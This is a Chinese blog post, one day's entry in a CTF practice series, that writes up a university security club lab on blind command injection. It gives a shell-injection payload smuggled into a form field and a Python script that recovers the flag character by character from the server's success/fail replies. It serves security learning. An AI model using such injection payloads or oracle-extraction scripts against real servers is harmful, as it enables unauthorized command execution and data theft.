---
title: IThome 2024 鐵人賽 一直刷 CTF - Day18
tags:
  - IThome 2024 鐵人賽
  - CTF
  - 資安
categories:
  - IThome 2024 鐵人賽
  - 一直刷 CTF
abbrlink: 54500
date: 2024-09-21 00:00:00
lang:
---

## 前言

本日進度：

- [x] [【成大資安社社課】WEB 2 - lab](https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)

<!--more-->

## 上課紀錄

### Lab - dig-blind

他只會回傳 `success` 和 `fail`，先試試看 `'; grep -q "NCKUCTF{d19_" /fl* && exit 0 || exit 1'` ，好欸，他回傳 `success` !!!!

但每一位都用人工猜有點太慢，可以寫個程式根據他回傳的 0 1 訊號反推 flag ，最笨的方法就是直接一個個慢慢枚舉，這樣複雜度會是 O(NK) ， N 是字串長度，K 是枚舉的字元集數量，根據之前的觀察字元集應該是 `0123456789abcdefghijklmnopqrstuvwxyz_!{}` ，雖然我想到比較好的方法是把每個字轉 ASCII ，再用二進位表示，這樣就只會最多 7 次就知道那一個字是啥了，能壓到 O(N)，但這樣寫有點累，而且字元集也不算太多，要是真的不行就再拿多執行緒來用也可以變成 O(N)

我的 python 程式碼：

```python
import requests

url = "http://140.116.246.59:28116/"
prefix = "NCKUCTF{d19_"  
charset = "0123456789abcdefghijklmnopqrstuvwxyz_!}"  
flag = prefix

while not flag.endswith("}"):
    for char in charset:
        payload = f"'; grep -q \"{flag + char}\" /fl* && exit 0 || exit 1'"
        data = {'name': payload}
        
        response = requests.post(url, data=data)
        
        if response.text.count("success") == 2:
            flag += char
            print(f"Found: {flag}")
            break

print(f"Final Flag: {flag}")
```

![Image](https://i.imgur.com/N6PEcTz.png)

## 參考資料

- [【成大資安社社課】手把手Python教學 --- 從入門到入侵](https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】WEB 1](https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】WEB 2](https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】不是web3.0的 web3 - Vincent55](https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV)
- [【成大資安社社課】Crypto 1](https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】Crypto 2](https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】Linux 基礎指令與使用者管理](https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】淺談網路與 H T T P](https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
